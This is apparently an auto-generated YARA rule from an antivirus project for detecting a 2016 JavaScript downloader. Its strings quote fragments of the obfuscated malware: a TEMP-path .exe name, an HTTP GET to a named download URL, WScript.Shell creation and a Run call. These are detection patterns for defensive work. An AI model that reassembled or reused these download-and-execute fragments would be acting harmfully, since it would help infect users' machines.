rule sig_20160329_46823516701337e989c16eef6ff652ba {
  meta:
    description = "datamaliciousorder - file 20160329_46823516701337e989c16eef6ff652ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "45578713c8f65aa738fb4559e959c8ce62d136f4aada7d2c8c04f4ecce883c8f"

  strings:
    $s1  = "function Kwbxku() {return Ngfto[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"G0x0Gpe2.exe\";};" fullword ascii
    $s2  = "Vnwmyqwel[Ggyxeqbl](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Aollm](Cnaplk() * 11)} while (Vnwmyqwel[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Dlxqmvrz(Kecowevmrh, Bemfcp){return Kecowevmrh - Bemfcp;};" fullword ascii
    $s5  = "var Ngfto = function Hmelr() {return WScript[Tbadrtlg](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Tqkgibe(Dtsocoven){Ngfto[\"Run\"](Dtsocoven, Isjtnbklxi, Isjtnbklxi);};" fullword ascii
    $s7  = "function Amkabneazc() {return ((Pkfuoa == true) && (Pkfuoa == Vnasjk)) ? 1 : Isjtnbklxi;};" fullword ascii
    $s8  = "function Aklpcdsjpw(Zklxuog) {var Pedbdz = (1, 2, 3, 4, 5, Zklxuog); return Pedbdz;};" fullword ascii
    $s9  = " while (Knmwvrm){" fullword ascii
    $s10 = "return Dlxqmvrz(Qydpzsvkxy, Ceawwfzmk);" fullword ascii
    $s11 = "var Vnasjk = false;" fullword ascii
    $s12 = "Vnasjk = true; " fullword ascii
    $s13 = "function Ovpadmegoh(){return Tbadrtlg;};" fullword ascii
    $s14 = "Pkfuoa = true; " fullword ascii
    $s15 = "var Pkfuoa = false;" fullword ascii
    $s16 = "var Qdqdq = false;" fullword ascii
    $s17 = "function Amrlysc()" fullword ascii
    $s18 = "function Tbtukczthf(){return Tghgamx;};" fullword ascii
    $s19 = "var Ozgmguk = new this[\"Date\"]();" fullword ascii
    $s20 = "function Cnaplk(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}